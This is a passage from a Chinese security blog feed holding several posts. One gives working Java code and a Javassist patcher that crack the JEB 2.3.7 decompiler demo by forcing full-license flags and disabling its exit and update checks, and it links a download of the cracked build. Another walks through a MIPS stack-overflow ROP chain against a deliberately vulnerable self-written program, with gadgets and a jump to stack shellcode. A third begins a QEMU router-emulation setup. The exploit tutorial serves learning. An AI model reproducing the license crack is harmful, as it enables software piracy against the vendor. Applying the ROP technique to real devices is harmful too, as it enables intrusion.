<li><p>使用ida反汇编mips程序时，它好像默认  <code>$t9</code> 的值为函数的起始地址,导致我们分析问题时造成困惑，pwndbg 和 <a href="http://www.radare.org/r/" target="_blank" rel="external">radare2</a> 就不会这样。</p>
</li>
</ul>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509086721263tsioi5wr.png?imageslim" alt="paste image"></p>
<p>感觉mips下还是 pwndbg 和 <a href="http://www.radare.org/r/" target="_blank" rel="external">radare2</a>靠谱</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-1/" target="_blank" rel="external">https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-1/</a></li>
</ul>
<p>注：</p>
<p>&emsp;&emsp;本文先发布于：<a href="https://xianzhi.aliyun.com/forum/topic/1510/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/1510/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mips rop </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[破解 jeb  2.3.7 demo]]></title>
      <url>/2017/10/27/crack_jeb_mips_2_3_7.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>使用的技术和上文的一样。</p>
<p><code>mips</code> 版本的修改版</p>
<p>百度云：</p>
<p>链接: <a href="https://pan.baidu.com/s/1c1Oh0x6" target="_blank" rel="external">https://pan.baidu.com/s/1c1Oh0x6</a> 密码: ekjj</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>安卓版</strong></p>
<p><code>jeb-2.3.7.201710262129-JEBDecompilerDemo-121820464987384338</code></p>
<p>重新编译一个 <code>com.pnfsoftware.jeb.client.Licensing</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div></pre></td><td class="code"><pre><div class="line">//</div><div class="line">// Source code recreated from a .class file by IntelliJ IDEA</div><div class="line">// (powered by Fernflower decompiler)</div><div class="line">//</div><div class="line"></div><div class="line">package com.pnfsoftware.jeb.client;</div><div class="line"></div><div class="line">import com.pnfsoftware.jeb.AssetManager;</div><div class="line">import com.pnfsoftware.jeb.util.format.Strings;</div><div class="line">import com.pnfsoftware.jeb.util.logging.GlobalLog;</div><div class="line">import com.pnfsoftware.jeb.util.logging.ILogger;</div><div class="line">import com.pnfsoftware.jebglobal.GN;</div><div class="line">import com.pnfsoftware.jebglobal.mW;</div><div class="line"></div><div class="line">public final class Licensing &#123;</div><div class="line">    private static final ILogger logger = GlobalLog.getLogger(Licensing.class);</div><div class="line">    public static final String user_email = &quot;love_lh@hac425.com&quot;;</div><div class="line">    public static final String user_group = &quot;hacker&quot;;</div><div class="line">    public static final int user_id = 2116188757;</div><div class="line">    public static final String user_name = &quot;hac425&quot;;</div><div class="line">    public static final int user_count = 20;</div><div class="line">    public static final int license_ts = 0;</div><div class="line">    public static final int license_validity = 40000;</div><div class="line">    public static int real_license_ts = 0;</div><div class="line">    public static int build_type = 0;</div><div class="line">    public static final int FLAG_AIRGAP = 8;</div><div class="line">    public static final int FLAG_ANYCLIENT = 16;</div><div class="line">    public static final int FLAG_COREAPI = 32;</div><div class="line">    public static final int FLAG_DEBUG = 1;</div><div class="line">    public static final int FLAG_FLOATING = 4;</div><div class="line">    public static final int FLAG_FULL = 2;</div><div class="line">    public static final int FLAG_JEB2 = 128;</div><div class="line"></div><div class="line"></div><div class="line">    static &#123;</div><div class="line">        int v0 = Licensing.build_type | 2;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        v0 |= 4;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        v0 |= 8;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        v0 |= 16;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        v0 |= 32;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        Licensing.build_type = v0 | 128;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    public Licensing() &#123;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final void setLicenseTimestamp(int var0) &#123;</div><div class="line">        real_license_ts = 1505267330;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final int getExpirationTimestamp() &#123;</div><div class="line">        return real_license_ts + 345600000;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final int getBuildType() &#123;</div><div class="line">        return build_type;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isDebugBuild() &#123;</div><div class="line">        return true;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isReleaseBuild() &#123;</div><div class="line">        return !isDebugBuild();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isFullBuild() &#123;</div><div class="line">        return true;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isDemoBuild() &#123;</div><div class="line">        return !isFullBuild();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isFloatingBuild() &#123;</div><div class="line">        return (build_type &amp; 4) != 0;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isIndividualBuild() &#123;</div><div class="line">        return !isFloatingBuild();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isAirgapBuild() &#123;</div><div class="line">        return (build_type &amp; 8) != 0;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isInternetRequired() &#123;</div><div class="line">        return false;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean allowAnyClient() &#123;</div><div class="line">        return (build_type &amp; 16) != 0;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean canUseCoreAPI() &#123;</div><div class="line">        return true;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final String getBuildTypeString() &#123;</div><div class="line">        StringBuilder var0 = new StringBuilder();</div><div class="line">        if (isReleaseBuild()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;-119, 23, 9, 9, 4, 18, 22, 74&#125;, 1, 251));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;35, 1, 7, 23, 18, 72&#125;, 1, 71));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (isFullBuild()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;37, 26, 28, 21, 93&#125;, 2, 39));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;39, 10, 29, 22, 93&#125;, 2, 200));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (isFloatingBuild()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;-114, 10, 3, 14, 21, 29, 7, 9, 72&#125;, 1, 232));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;42, 1, 20, 16, 4, 0, 3, 29, 21, 76, 7&#125;, 2, 150));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (isAirgapBuild()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;34, 6, 2, 84, 21, 8, 23, 71&#125;, 2, 100));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;8, 23, 20, 92, 68, 7, 26, 17, 23, 28, 11, 17, 91&#125;, 1, 122));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (allowAnyClient()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;82, 15, 23, 84, 78, 15, 5, 12, 11, 26, 91&#125;, 1, 51));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;-85, 9, 0, 15, 10, 10, 8, 13, 65, 78, 15, 5, 12, 11, 26, 91&#125;, 1, 196));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (canUseCoreAPI()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;32, 0, 2, 28, 95, 8, 23, 1&#125;, 2, 169));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;-27, 1, 66, 78, 12, 29, 23, 72, 76, 17, 25&#125;, 1, 139));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return var0.toString();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static String getLicense() &#123;</div><div class="line">        byte[] var0 = AssetManager.UU(&quot;LICENSE.TXT&quot;);</div><div class="line">        return var0 == null ? null : Strings.decodeUTF8(var0);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static String getChangeList() &#123;</div><div class="line">        byte[] var0 = AssetManager.UU(&quot;CHANGELIST.TXT&quot;);</div><div class="line">        return var0 == null ? null : Strings.decodeUTF8(var0);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后patch掉退出函数和更新检测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">package me.hacklh;</div><div class="line"></div><div class="line">import com.pnfsoftware.jeb.Launcher;</div><div class="line">import javassist.ClassPool;</div><div class="line">import javassist.CtClass;</div><div class="line">import javassist.CtMethod;</div><div class="line">import javassist.CtNewMethod;</div><div class="line">import com.pnfsoftware.jeb.client.Licensing;</div><div class="line"></div><div class="line"></div><div class="line">public class JebCracker &#123;</div><div class="line"></div><div class="line">    public static void main(String[] args) throws Exception &#123;</div><div class="line"></div><div class="line">//        com.pnfsoftware.jeb.installer.Launcher.main(new String[]&#123;&quot;--di&quot;&#125;);</div><div class="line">//        DES.main(args);</div><div class="line">//         Launcher.main(new String[]&#123;&quot;--generate-key&quot;&#125;);</div><div class="line">        CtClass.debugDump = &quot;./debugDump/&quot;;</div><div class="line"></div><div class="line">        System.out.println(Licensing.allowAnyClient());</div><div class="line"></div><div class="line">        /**</div><div class="line">         * 修改getStatus， AbstractContext会起几个线程修改status</div><div class="line">         */</div><div class="line">        ClassPool pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.client.AbstractContext&quot;);</div><div class="line">        CtClass old_class = pool.get(&quot;com.pnfsoftware.jeb.client.AbstractContext&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        CtMethod old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;getStatus&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return 0;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;terminate&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">        /**</div><div class="line">         * patch 掉与网络下载有关的函数，禁止升级</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.util.net.Net&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jeb.util.net.Net&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line"></div><div class="line">                (</div><div class="line">                        &quot;downloadBinary&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(String.class.getName())</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return null;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;httpPost&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(String.class.getName()),</div><div class="line">                                        pool.get(String.class.getName()),</div><div class="line">                                        pool.get(long[].class.getName())</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return null;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509071049085jtzkc8nm.png?imageslim" alt="paste image"></p>
<p><strong>mips版</strong><br>类似</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>可以在jeb的官网下载其他平台的适配包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.pnfsoftware.com/jeb2/support-package</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> jeb破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jeb 2.3.7 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之路由器环境修复&&rop技术分析]]></title>
      <url>/2017/10/26/step_by_step_pwn_router_part2.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274</a></p>
<hr>
<p>拿到路由器的固件后，第一时间肯定是去运行目标程序，一般是web服务程序。我们可以去 <code>/etc/init.d/</code> 找启动文件，或者看看一些有可能的目录。一般来说路由器的程序很少的情况下是可以直接用qemu运行起来的。我们需要做一些修复的工作，本文会介绍一个常用的方法，后面会分析在 <code>mips uclibc</code> 中常用的 <code>rop</code> 手法。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>运行环境修复</strong></p>
<p>由于路由器运行时会去 nvram中获取配置信息，而我们的qemu中是没有该设备，路由器中的程序可能会因为没法获取配置信息而退出。我们可以使用    <code>https://github.com/zcutlip/nvram-faker</code> 配合着设置 <code>LD_PRELOAD</code> 环境变量来使用( 类似于一种 <code>hook</code> )。如果你的mips交叉编译工具链和它脚本里面的不一样就要修改它的脚本，比如</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15090309370211cupr2kg.png?imageslim" alt="paste image"><br>编译后把 <code>libnvram-faker.so</code> 和 <code>nvram.ini</code> 放到 <code>/</code> 目录，然后使用 <code>LD_PRELOAD</code>来加载。即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chroot . ./qemu-mips-static -E LD_PRELOAD=/libnvram-faker.so  /usr/bin/httpd</div></pre></td></tr></table></figure>
<p>如果程序还会在其他地方保错，就要自己分析程序，然后根据实际情况，在 <code>nvram-faker</code> 增加 <code>hook代码</code></p>
<p>注：</p>
<ul>
<li>要注意目标应用是用的 <code>glibc</code> 还是 <code>uclibc</code> ,从而选择对应的交叉编译工具链来进行编译。</li>
<li>先使用 <code>firmadyne</code> 运行看看，然后优先选择 <code>qemu-system-mips-static</code>来调试，实在不行用 <code>qemu-system</code></li>
<li>如果需要某些静态编译（给生成的Makefile里面增加 <code>-static</code> 选项）的程序，建议去 <code>qemu-system</code> 编译，交叉编译太麻烦了。</li>
</ul>
<hr>
<p><strong>MIPS ROP分析</strong></p>
<p>看了 <a href="http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/" target="_blank" rel="external">Exploiting a MIPS Stack Overflow</a> 做的实验，因为    <code>tplink</code>上没有对应版本的固件了。于是只能自己写一个栈溢出的程序，并配合着gdb调试，来模拟整个rop过程。</p>
<p>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;  </div><div class="line">#include &lt;stdlib.h&gt;  </div><div class="line">#include &lt;unistd.h&gt;  </div><div class="line"></div><div class="line"></div><div class="line">void getshell()&#123;</div><div class="line">    system(&quot;sh&quot;);</div><div class="line">    sleep(1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void vulnerable_function() &#123;  </div><div class="line">    char buf[128]; </div><div class="line">    read(STDIN_FILENO, buf, 256);  </div><div class="line">&#125;  </div><div class="line">   </div><div class="line">int main(int argc, char** argv) &#123; </div><div class="line">	printf(&quot;%p\n&quot;, (int *)write); </div><div class="line">    vulnerable_function();  </div><div class="line">    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>因为要使用 <code>qemu-mips-static</code> 来调试程序，这样就不方便找到libc的基地址。于是在程序运行时把libc中的函数地址打印出来，然后计算基地址，便于我们找到gadgets具体在内存中的位置。然后使用 uclibc的交叉编译工具链来编译。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/home/haclh/router_exploit/cross-compiler-mips/bin/mips-gcc level1.c -o level1</div></pre></td></tr></table></figure></p>
<p>把它扔到一个路由器文件系统目录中，这样就不用单独拷贝它依赖的lib了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15090326039915db83l6b.png?imageslim" alt="paste image"></p>
<p>可以看到程序使用了 uClibc，通过查看qemu的maps，找到uClibc的路径<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15090327179167od9lz52.png?imageslim" alt="paste image"></p>
<p>拿到ida中分析找 gadgets.具体可以看上面的那篇文章。找到的gadgets如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">rop_gad1:</div><div class="line">	LOAD:00055C60                 li      $a0, 1</div><div class="line">	LOAD:00055C64                 move    $t9, $s1</div><div class="line">	LOAD:00055C68                 jalr    $t9 ; sub_55960</div><div class="line">	LOAD:00055C5C                 lui     $s0, 2</div><div class="line"></div><div class="line">gadg_2</div><div class="line"></div><div class="line">	LOAD:0001E20C                 move    $t9, $s1</div><div class="line">	LOAD:0001E210                 lw      $ra, 0x28+var_4($sp)</div><div class="line">	LOAD:0001E214                 lw      $s2, 0x28+var_8($sp)</div><div class="line">	LOAD:0001E218                 lw      $s1, 0x28+var_C($sp)</div><div class="line">	LOAD:0001E21C                 lw      $s0, 0x28+var_10($sp)</div><div class="line">	LOAD:0001E220                 jr      $t9</div><div class="line">	LOAD:0001E224                 addiu   $sp, 0x28</div><div class="line"></div><div class="line"></div><div class="line">rop_gad3:</div><div class="line">	LOAD:000164C0                 addiu   $s2, $sp, 0x198+var_180</div><div class="line">	LOAD:000164C4                 move    $a2, $v1</div><div class="line">	LOAD:000164C8                 move    $t9, $s0</div><div class="line">	LOAD:000164CC                 jalr    $t9 ; mempcpy</div><div class="line">	LOAD:000164D0                 move    $a0, $s2</div><div class="line"></div><div class="line"></div><div class="line">rop_gad4:</div><div class="line">	LOAD:000118A4                 move    $t9, $s2</div><div class="line">	LOAD:000118A8                 jalr    $t9</div></pre></td></tr></table></figure></p>
<p>rop的过程，和对应的sp寄存器的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">sp:0x76fff710</div><div class="line">首先进入 rop_gad1， $s1 gadg_2</div><div class="line"></div><div class="line">sp:0x76fff710</div><div class="line">进入 gadg_2，这时$s1还是gadg_2， 从内存加载数据到寄存器s1--&gt;sleep, ra--&gt; rop_gad3, $s0---&gt;rop_gad4</div><div class="line"></div><div class="line">sp:0x76fff738</div><div class="line">再次进入 gadg_2,s1--&gt;sleep, ra--&gt; rop_gad3, $s0---&gt;rop_gad4</div><div class="line"></div><div class="line">sp:0x76fff760</div><div class="line">进入 rop_gad3， 获取栈地址到$s2,跳到 $s0</div><div class="line"></div><div class="line"></div><div class="line">进入rop_gad4，s2--&gt;0x76fff778 跳进栈中，。。。</div></pre></td></tr></table></figure></p>
<p><strong>gdb调试的部分截图</strong></p>
<p>断在函数返回地址被覆盖的时候，使用gdb命令，设置<code>$pc</code>寄存器的值，伪造劫持程序流程到 rop_gad1<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509033066831ysbgu293.png?imageslim" alt="paste image"></p>
<p>汇编代码如下<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509033106631mwc1gl07.png?imageslim" alt="paste image"></p>
<p>第一次进入rop_gad2<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15090332319233l54m90b.png?imageslim" alt="paste image"></p>
<p>第二次运行到 rop_gad2 时的寄存器状态。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509033335464zv8t8p6f.png?imageslim" alt="paste image"></p>
<p><code>t9</code> 指向 <code>sleep</code>函数，接下来调用 <code>sleep(1)</code> 刷新 <code>cache</code>, 便于后面指向 <code>shellcode</code>。次数的 <code>$ra</code> 为 <code>rop_gad3</code>的地址，便于在 <code>sleep</code> 返回后继续 <code>rop</code> ,获取一个栈的指针到寄存器，便于后面直接跳过去。</p>
<p>进入rop_gad3</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509033654570mt5p9xro.png?imageslim" alt="paste image"></p>
<p>进入 rop_gad4,跳到栈上执行shellcode</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509033720821o12bll0r.png?imageslim" alt="paste image"></p>
<p>分析完毕。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>修复环境要注意使用的gcc, 必要时自己跟踪，逆向代码，修复运行环境。看了几篇mips漏洞利用的文章，rop的思路就是上面的思路，估计那就是通用思路吧，记录下来，以备不时只需。调rop的过程还是有趣的。</p>
<p>参考链接：</p>
<p><a href="http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/" target="_blank" rel="external">http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/</a></p>
<p>注：</p>
<p>&emsp;&emsp;本文先发布于：<a href="https://xianzhi.aliyun.com/forum/topic/1509/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/1509/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mips rop </tag>
            
            <tag> 路由器安全 </tag>
            
            <tag> 路由器环境修复 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之环境搭建]]></title>
      <url>/2017/10/26/step_by_step_pwn_router_part1.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274</a></p>
<hr>
<p>正式进入路由器的世界了。感觉路由器这块就是固件提取，运行环境修复比较麻烦，其他部分和一般的 pwn 差不多。由于大多数路由器是 mips 架构的，本文就以搭建  <code>MIPS运行、调试平台</code> 为例介绍环境的搭建。其他架构类似。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h6 id="安装-与-配置-Qemu"><a href="#安装-与-配置-Qemu" class="headerlink" title="安装 与 配置 Qemu:"></a>安装 与 配置 Qemu:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install qemu </div><div class="line">sudo apt-get install qemu-user-static</div><div class="line">sudo apt-get install qemu-system</div></pre></td></tr></table></figure>
<p>配置网络</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install bridge-utils uml-utilities</div></pre></td></tr></table></figure>
<p>修改 <code>/etc/network/interfaces</code> </p>
